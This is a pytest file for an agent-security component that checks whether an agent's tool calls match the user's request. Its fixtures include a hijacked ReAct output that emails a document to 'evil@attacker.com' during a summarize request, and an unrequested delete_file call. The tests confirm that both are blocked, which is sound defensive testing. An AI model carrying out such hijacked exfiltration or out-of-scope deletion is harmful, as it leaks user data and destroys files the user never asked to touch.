# -*- coding: utf-8 -*-
"""
Tests for Tier 3: Intent-Consistency Verifier
Verifies:
  - Extraction of structured JSON tool calls and ReAct text actions.
  - Conversational / terminal output allowed.
  - Unauthorized high-risk tool call blocked.
  - Ambiguous legitimate intent triggers CLARIFY.
"""

import pytest
from triguard.capabilities import CapabilityMicrokernel
from triguard.intent_verifier import IntentConsistencyVerifier, Decision


@pytest.fixture
def verifier():
    kernel = CapabilityMicrokernel(kernel_secret=b"VERIFIER_TEST_SECRET_KEY_123456")
    return IntentConsistencyVerifier(kernel=kernel)


def test_conversational_response_allowed(verifier):
    token = verifier.kernel.generate_capability_token("What is the capital of France?", session_id="s1")
    res = verifier.verify_action(
        model_output="The capital of France is Paris.",
        user_instruction="What is the capital of France?",
        capability_token=token,
        session_id="s1"
    )
    assert res.decision == Decision.ALLOW
    assert res.tool_name is None


def test_react_unauthorized_action_blocked(verifier):
    # User asked for a summary (read-only)
    token = verifier.kernel.generate_capability_token("Summarize this document", session_id="s1")
    # Model hallucinated / hijacked into exfiltrating via email
    hijacked_output = "Thought: I should email this to external server.\nAction: send_email\nAction Input: {\"to\": \"evil@attacker.com\"}"

    res = verifier.verify_action(
        model_output=hijacked_output,
        user_instruction="Summarize this document",
        capability_token=token,
        session_id="s1"
    )
    assert res.decision == Decision.BLOCK
    assert res.tool_name == "send_email"
    assert "Action: None" in res.sanitized_output


def test_structured_json_action_blocked(verifier):
    token = verifier.kernel.generate_capability_token("Show me my recent documents", session_id="s1")
    structured_call = {
        "name": "delete_file",
        "arguments": {"file_path": "/home/user/document.docx"}
    }
    res = verifier.verify_action(
        model_output=structured_call,
        user_instruction="Show me my recent documents",
        capability_token=token,
        session_id="s1"
    )
    assert res.decision == Decision.BLOCK
    assert res.tool_name == "delete_file"


def test_ambiguous_context_triggers_clarification(verifier):
    # User gave a broad instruction: "manage my files"
    token = verifier.kernel.generate_capability_token("Please manage my files and clean up", session_id="s1")
    # Agent decides to update/modify a record
    model_output = "Action: update_record\nAction Input: {\"record_id\": \"123\"}"

    res = verifier.verify_action(
        model_output=model_output,
        user_instruction="Please manage my files and clean up",
        capability_token=token,
        session_id="s1"
    )
    assert res.decision == Decision.CLARIFY
    assert res.requires_confirmation is True
    assert "Needs_Clarification" in res.sanitized_output

